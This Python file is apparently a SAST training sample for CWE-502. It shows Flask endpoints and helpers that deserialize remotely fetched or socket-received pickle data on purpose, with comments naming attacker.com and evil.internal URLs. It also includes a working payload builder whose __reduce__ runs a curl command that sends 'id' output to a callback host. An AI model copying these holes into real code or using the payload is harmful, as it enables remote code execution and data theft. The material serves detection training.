# VULNERABLE: Remote Pickle RCE - Training Sample
# CWE-502: Deserialization of Untrusted Data
# Severity: CRITICAL
# Description: Pickle payloads fetched from remote URLs or received over network
#              sockets are deserialized without validation, enabling remote code execution

import pickle
import socket
import struct
import urllib.request
import requests
import base64
from flask import Flask, request, jsonify

app = Flask(__name__)


# ── Fetch from remote URL and deserialize ─────────────────────────────────────

def load_remote_model(model_url: str):
    """VULNERABLE: Downloads a pickle file from a remote URL and loads it."""
    # VULN: model_url = "http://attacker.com/malicious_model.pkl"
    response = requests.get(model_url)
    raw = response.content
    # VULN: no integrity check (no hash / signature verification)
    return pickle.loads(raw)


def sync_config_from_remote(config_url: str):
    """VULNERABLE: Configuration object fetched remotely and deserialized."""
    # VULN: config_url = "http://evil.internal/config.pkl"
    with urllib.request.urlopen(config_url) as f:
        data = f.read()
    return pickle.loads(data)   # VULN


def pull_and_execute(url: str):
    """VULNERABLE: Fetches a pickle payload and immediately executes the result."""
    # VULN: combines SSRF + insecure deserialization
    resp = requests.get(url, timeout=5)
    obj = pickle.loads(resp.content)   # VULN: __reduce__ fires here
    if callable(obj):
        return obj()   # VULN: if payload returns a callable, it's invoked again
    return obj


# ── Network socket deserialization ────────────────────────────────────────────

def receive_and_process(host: str, port: int):
    """VULNERABLE: Receives raw bytes from network socket and deserializes."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    # Receive length prefix then payload
    raw_len = s.recv(4)
    length = struct.unpack(">I", raw_len)[0]
    data = s.recv(length)
    s.close()
    # VULN: data from untrusted network endpoint is deserialized
    return pickle.loads(data)


def message_queue_consumer(raw_message: bytes):
    """VULNERABLE: Message queue consumer deserializes every message."""
    # VULN: any queue publisher can inject a malicious pickle
    # Common pattern in Celery workers using pickle serializer
    task = pickle.loads(raw_message)
    return task.run()


# ── Flask endpoints ────────────────────────────────────────────────────────────

@app.route("/api/import-model", methods=["POST"])
def import_model():
    """VULNERABLE: Imports ML model from URL specified in JSON body."""
    data = request.get_json()
    url = data.get("model_url", "")
    # VULN: SSRF + pickle deserialization chained — attacker controls both the
    #       network target and the content
    model = load_remote_model(url)
    return jsonify({"model_type": type(model).__name__})


@app.route("/api/sync-plugin", methods=["POST"])
def sync_plugin():
    """VULNERABLE: Downloads and activates a plugin from remote pickle URL."""
    plugin_url = request.json.get("url", "")
    # VULN: plugin URL and content fully attacker-controlled
    response = requests.get(plugin_url, timeout=10)
    plugin = pickle.loads(response.content)   # VULN
    if hasattr(plugin, "activate"):
        plugin.activate()   # VULN: calls attacker-defined method
    return jsonify({"status": "activated"})


@app.route("/api/distributed-task", methods=["POST"])
def distributed_task():
    """VULNERABLE: Task payload received from another service and deserialized."""
    # VULN: assumes the sending service is trusted; no HMAC verification
    raw_task = request.data
    task = pickle.loads(raw_task)   # VULN
    result = task.execute()
    return jsonify({"result": str(result)})


@app.route("/api/load-checkpoint")
def load_checkpoint():
    """VULNERABLE: ML training checkpoint loaded from S3 URL without verification."""
    checkpoint_url = request.args.get("url", "")
    # VULN: S3 URL can be replaced with attacker-controlled URL
    resp = requests.get(checkpoint_url)
    checkpoint = pickle.loads(resp.content)   # VULN
    return jsonify({"epoch": getattr(checkpoint, "epoch", "unknown")})


# ── Utility: build a demonstrative RCE payload (for SAST training only) ───────

def build_remote_rce_payload(callback_url: str) -> bytes:
    """
    Constructs a pickle payload that performs an HTTP callback on deserialization.
    Demonstrates that __reduce__ runs BEFORE any application code touches the object.
    """
    import os

    class RemoteCallback:
        def __init__(self, url):
            self.url = url

        def __reduce__(self):
            # On pickle.loads(), this calls os.system with curl
            cmd = f"curl -s '{self.url}?data=$(id|base64)'"
            return (os.system, (cmd,))

    return pickle.dumps(RemoteCallback(callback_url))


if __name__ == "__main__":
    print("Remote pickle payload size:", len(build_remote_rce_payload("http://example.com")))
    app.run(debug=True)